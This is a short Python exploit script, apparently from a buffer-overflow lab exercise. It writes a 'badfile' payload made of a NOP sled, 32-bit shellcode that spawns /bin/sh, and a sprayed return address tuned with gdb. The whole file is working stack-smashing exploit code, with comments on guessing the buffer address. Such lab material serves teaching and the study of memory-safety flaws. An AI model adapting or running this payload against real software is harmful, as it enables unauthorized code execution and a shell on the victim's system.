#!/usr/bin/python3
import sys

# buffer size is unknown, use the “spraying” technique, 
# to spray the buffer with the return address so one of them must be in the right position.

badfilesize = 517
# Replace the content with the actual shellcode
# You may copy it from ../shellcode/call_shellcode.c
# len(32bit shellcode)=27; len(64bit shellcode)=30
shellcode32= (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80" 
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(badfilesize)) 

##################################################################
# Put the shellcode32 at the end of the payload
start = badfilesize - len(shellcode32)
content[start:] = shellcode32

# use gdb get the buffer’s address &buffer
# add 200 to this address to compensate the difference caused by the debugger. 
# i.e. the actual &buffer is predicted to be &buffer + 200
# so &buffer + 200 +200 < the return address < shellcode32 start address
# let ret=&buffer+400, if it does not work, choose another number

ret = 0xffffca00 + 400 # change this number
# The offset must be multiple of address size, spray it from 0 to 200=50*4
L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
for i in range(50):
	offset = i*4
	content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
